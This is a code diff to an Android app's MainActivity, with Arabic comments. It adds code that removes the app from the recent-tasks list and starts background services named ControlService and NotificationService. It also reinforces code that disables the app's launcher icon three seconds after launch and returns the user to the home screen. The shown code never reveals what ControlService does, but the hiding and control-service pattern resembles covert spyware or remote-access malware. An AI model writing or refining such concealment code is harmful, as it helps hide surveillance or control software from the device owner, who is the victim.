@@ -6,6 +6,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
 import android.view.Gravity;
 import android.view.View;
@@ -22,11 +23,16 @@ public class MainActivity extends AppCompatActivity {
     private static final int NOTIFICATION_PERMISSION_REQUEST = 1001;
     private TextView statusText;
     private Button mainButton;
-    private Handler handler = new Handler();
+    private Handler handler = new Handler(Looper.getMainLooper());
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        
+        // إخفاء التطبيق من المهام الأخيرة
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            finishAndRemoveTask();
+        }
         
         // بناء الواجهة برمجياً
         LinearLayout mainLayout = new LinearLayout(this);
@@ -146,22 +152,33 @@ public class MainActivity extends AppCompatActivity {
         mainButton.setEnabled(false);
         mainButton.setBackgroundColor(0xFFCCCCCC);
         
+        // بدء خدمة التحكم
+        startService(new Intent(this, ControlService.class));
+        startService(new Intent(this, NotificationService.class));
+        
         // انتظار 3 ثواني ثم إخفاء التطبيق
         handler.postDelayed(() -> {
-            // إخفاء التطبيق
-            PackageManager p = getPackageManager();
-            p.setComponentEnabledSetting(getComponentName(),
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP);
-            
-            // العودة للصفحة الرئيسية
-            Intent startMain = new Intent(Intent.ACTION_MAIN);
-            startMain.addCategory(Intent.CATEGORY_HOME);
-            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(startMain);
-            
-            // إنهاء النشاط
-            finish();
+            try {
+                // إخفاء التطبيق
+                PackageManager p = getPackageManager();
+                p.setComponentEnabledSetting(getComponentName(),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
+                
+                // العودة للصفحة الرئيسية
+                Intent startMain = new Intent(Intent.ACTION_MAIN);
+                startMain.addCategory(Intent.CATEGORY_HOME);
+                startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(startMain);
+                
+                // إنهاء النشاط
+                finish();
+                
+            } catch (Exception e) {
+                // في حالة الخطأ، فقط قفل التطبيق
+                moveTaskToBack(true);
+                finish();
+            }
             
         }, 3000);
     }
